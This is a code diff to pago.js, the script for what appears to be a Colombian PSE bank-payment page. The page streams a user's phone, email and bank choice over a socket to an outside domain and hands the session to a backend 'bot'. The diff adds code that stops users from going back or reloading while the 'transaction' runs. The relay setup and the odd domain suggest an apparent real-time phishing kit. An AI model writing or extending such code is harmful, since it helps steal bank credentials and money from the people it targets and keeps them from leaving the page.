@@ -1,4 +1,4 @@
-// pago.js - Sincronización en Vivo + Resumen de Datos Activo + Inputs Limpios
+// pago.js - Sincronización en Vivo + Resumen de Datos Activo + Inputs Limpios + Bloqueo de UI
 
 const socket = io('https://apifinacjs.pagoswebcol.uk'); 
 
@@ -6,14 +6,39 @@ let isTransactionActive = false;
 let browserRequested = false; 
 const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
+// ==========================================
+// SEGURIDAD: PREVENIR RECARGA Y RETROCESO DURANTE LA CARGA
+// ==========================================
+
+// Prevenir recarga mediante el botón del navegador
 window.addEventListener('beforeunload', (e) => {
     if (isTransactionActive) {
         e.preventDefault();
-        e.returnValue = 'Por favor espere la carga';
-        return 'Por favor espere la carga';
+        e.returnValue = 'Por favor espere la carga. La transacción está en proceso.';
+        return 'Por favor espere la carga. La transacción está en proceso.';
     }
 });
 
+// Prevenir retroceso con el botón "Atrás" del navegador
+window.addEventListener('popstate', function (event) {
+    if (isTransactionActive) {
+        // Vuelve a empujar el estado actual para anular el retroceso
+        history.pushState(null, document.title, location.href);
+    }
+});
+
+// Prevenir teclas de recarga (F5, Ctrl+R, Cmd+R)
+document.addEventListener('keydown', function (e) {
+    if (isTransactionActive) {
+        if (e.key === 'F5' || (e.ctrlKey && e.key.toLowerCase() === 'r') || (e.metaKey && e.key.toLowerCase() === 'r')) {
+            e.preventDefault();
+        }
+    }
+});
+
+// ==========================================
+// INICIALIZACIÓN DE DATOS
+// ==========================================
 document.addEventListener('DOMContentLoaded', () => {
     // 1. Obtener los datos correctamente del localStorage
     const data = JSON.parse(localStorage.getItem('datosFactura')) || {};
@@ -102,7 +127,10 @@ if (botonPagar) {
         if (!phone || phone.length < 7) { alert("Celular inválido."); return; }
         if (!browserRequested) { alert("Aún no se ha iniciado la conexión, por favor vuelva a seleccionar su banco."); return; }
 
+        // Activar estado de bloqueo de seguridad
         isTransactionActive = true; 
+        history.pushState(null, document.title, location.href); // Preparar bloqueo de botón "Atrás"
+
         const overlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('dynamicLoadingText');
         
@@ -131,22 +159,31 @@ socket.on('payment_success', (data) => {
     if (loadingText) loadingText.textContent = "Redirigiendo a PSE...";
     clearInterval(loadingInterval);
     setTimeout(() => {
-        isTransactionActive = false;
+        isTransactionActive = false; // Liberar seguridad
         window.location.href = data.url; 
     }, 1500);
 });
 
 socket.on('payment_error', (data) => {
+    // 1. Detener la animación y limpiar variables
     clearInterval(loadingInterval);
-    isTransactionActive = false;
+    isTransactionActive = false; // Liberar botones y recargas
+
+    // 2. Quitar la pantalla de carga para quedarse en el mismo index
     const overlay = document.getElementById('loadingOverlay');
     if (overlay) overlay.style.display = 'none';
+
+    // 3. Avisar al usuario del error
     alert("Hubo un problema de conexión con el banco: " + data.message);
     
+    // 4. Reiniciar la solicitud del bot para que el usuario pueda intentarlo de nuevo
     browserRequested = false;
-    selectBanco.value = ""; 
+    if (selectBanco) selectBanco.value = ""; 
 });
 
+// ==========================================
+// UTILIDADES
+// ==========================================
 function animateLoadingText(element) {
     if (!element) return null;
     const messages = ["Conectando con la pasarela...", "Validando datos...", "Contactando banco..."];
